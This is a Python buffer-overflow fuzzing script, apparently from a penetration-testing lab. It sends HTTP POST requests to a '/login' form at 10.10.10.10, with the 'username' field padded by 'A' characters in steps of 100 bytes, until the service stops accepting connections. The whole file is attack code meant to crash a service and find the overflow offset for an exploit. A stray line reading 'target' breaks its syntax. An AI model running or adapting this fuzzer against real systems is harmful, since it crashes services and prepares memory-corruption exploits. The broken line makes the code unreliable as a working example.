#!/usr/bin/env python

import socket 
import sys 
import time 

address = "10.10.10.10"
port = 80
target
size = 100 

while(size < 2000): 
    try:
        print("[*] Fuzzing with %s bytes" % size)
        fuzz = "A" * size
        content = "username=" + fuzz + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: " + address + "\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://" + address + "/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " + str(len(content)) + "\r\n"
        buffer += "\r\n"
        buffer += content
        client = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        client.connect((address, port))
        client.send(buffer)
        client.close()
        size += 100
        time.sleep(10)
    except:
        print("[x] Failed to connect to " + address)
        sys.exit()
